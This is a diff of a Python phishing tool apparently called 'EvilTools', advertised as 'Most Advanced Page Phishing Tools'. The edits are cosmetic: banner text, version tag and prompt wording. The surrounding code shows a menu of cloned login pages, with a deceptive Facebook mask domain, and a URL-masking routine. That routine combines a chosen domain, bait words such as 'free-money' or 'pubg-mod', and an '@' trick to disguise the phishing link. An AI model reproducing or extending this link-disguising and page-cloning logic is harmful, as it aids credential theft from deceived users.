@@ -115,12 +115,12 @@ pkgs=[ "php", "curl", "wget", "unzip" ]
 
 logo='''
 	  _____       _ _   _____           _     
-	 | ____|_   _(_) | |_   _|__   ___ | |___ 
+	 | ____|_   _(_) | |_   _|__   ___ | |___  v1.4 Beta
 	 |  _| \ \ / / | |   | |/ _ \ / _ \| / __|
 	 | |___ \ V /| | |   | | (_) | (_) | \__ \                
 	 |_____| \_/ |_|_|   |_|\___/ \___/|_|___/	 
 	
-	       Advanced Page Phishing Tools
+	     Most Advanced Page Phishing Tools
 '''
 
 # Website chooser
@@ -219,7 +219,7 @@ def sudoinstaller(pm):
 
 # Ask to mask url
 def cuask(url):
-    cust= input("\n"+ask+bcyan+"Wanna try custom link?(y or press enter to skip) > ")
+    cust= input("\n"+ask+bcyan+"Wanna try custom LINK? (Press Y or Press enter to skip) => ")
     if not cust=="":
         masking(url)
     waiter()
@@ -237,7 +237,7 @@ def about():
     print()
     print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
     print()
-    abot= input("\n > ")
+    abot= input("\n => ")
     if abot== "0":
         exit()
     else:
@@ -368,7 +368,7 @@ def main():
         os.system("clear")
         slowprint(logo)
         options()
-        choose= input(ask+"Select one of the options > "+nc)
+        choose= input(ask+"Select one of the Options => "+nc)
         if choose == "1" or choose == "01":
             folder="facebook"
             mask="https://verified-facebook-account-login-server"
@@ -576,31 +576,31 @@ def masking(url):
         sprint("\n"+success+"Your url is > "+ final)
         waiter()
     if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
-        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
+        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) => ")
         if (bait==""):
             sprint("\n"+error+"No bait word!")
             final= domain+"@"+main
-            sprint("\n"+success+"Your url is > "+ final)
+            sprint("\n"+success+"Your url is => "+ final)
             waiter()
         if bait.find(" ")!=-1:
             sprint("\n"+error+"Space in bait word!")
             waiter()
         final= domain+"-"+bait+"@"+main
-        sprint("\n"+success+"Your url is > "+ final)
+        sprint("\n"+success+"Your url is => "+ final)
         waiter()
     else:
         domain= "https://"+domain
-        bait= input("\n"+ask+"Enter bait words without space and hyphen(Example: free-money, pubg-mod) > ")
+        bait= input("\n"+ask+"Enter bait words without space and hyphen(Example: free-money, pubg-mod) => ")
         if bait=="":
             sprint("\n"+error+"No bait word!")
             final= domain+"@"+main
-            sprint("\n"+success+"Your url is > "+ final)
+            sprint("\n"+success+"Your url is => "+ final)
             waiter()
         if bait.find(" ")!=-1:
             sprint("\n"+error+"Space in bait word!")
             waiter()
         final= domain+"-"+bait+"@"+main
-        sprint("\n"+success+"Your url is > "+ final)
+        sprint("\n"+success+"Your url is => "+ final)
         waiter()
 
 # Output urls
